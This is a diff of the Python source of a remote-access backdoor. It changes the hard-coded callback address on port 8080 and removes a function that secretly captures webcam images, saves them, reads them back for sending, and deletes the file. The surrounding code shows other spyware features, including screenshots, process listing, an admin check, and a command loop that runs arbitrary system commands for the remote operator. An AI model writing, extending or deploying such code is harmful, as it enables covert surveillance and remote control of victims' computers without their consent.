@@ -1,6 +1,5 @@
 import os
 import sys
-import cv2
 import time
 import json
 import socket
@@ -18,7 +17,7 @@ import ctypes, sys
 import time
 import hashlib
 
-ip = "192.168.0.76"
+ip = "192.168.0.13"
 port = 8080
 
 def is_admin():
@@ -249,26 +248,6 @@ class backdoor:
         except Exception as e:
             return "[-] Error getting screenshot data: {}.".format(e)
 
-    def get_webcam_snap(self):
-        try:
-            cam = cv2.VideoCapture(0)
-            ret, frame = cam.read()
-
-            current_time = datetime.datetime.now()
-            path = "{}/Webcam{}{}{}.png".format(self.USER_PROFILE, current_time.year, current_time.month, current_time.day)
-
-            cv2.imwrite(path, frame)
-
-            file_data = self.read_file(path)
-            self.task_manager.delete_path(path)
-
-            cam.release()
-            cv2.destroyAllWindows()
-
-            return file_data
-        except Exception as e:
-            return "[-] Couldn't get a snap of the webcam: {}.".format(e)
-
     def change_working_directory(self, path):
         try:
             os.chdir(path)
@@ -338,8 +317,6 @@ class backdoor:
                         command_result = self.task_manager.get_idle_duration()
                     elif command_0 == "ps":     # List processes
                         command_result = self.task_manager.get_processes()
-                    elif command_0 == "webcam":
-                        command_result = self.get_webcam_snap()                                          
                     else:       # System command
                         command_result = self.execute_system_command(command)
                 else:       # Commands that require arguments
